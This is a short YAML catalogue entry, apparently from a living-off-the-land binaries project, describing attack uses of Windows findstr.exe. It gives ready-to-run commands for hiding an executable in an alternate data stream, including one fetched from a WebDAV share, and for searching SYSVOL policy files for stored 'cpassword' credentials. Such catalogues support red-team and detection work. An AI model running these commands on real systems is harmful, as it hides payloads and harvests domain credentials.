---
Name: Findstr.exe
Description: Add ADS, Search
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe
    Description: ''
  - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
    Description: ''
  - Command: findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
    Description: ''
Full Path:
  - c:\windows\system32\findstr.exe
  - c:\windows\sysWOW64\findstr.exe
Code Sample: []
Detection: []
Resources:
  - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
Notes: Thanks to Oddvar Moe - @oddvarmoe
---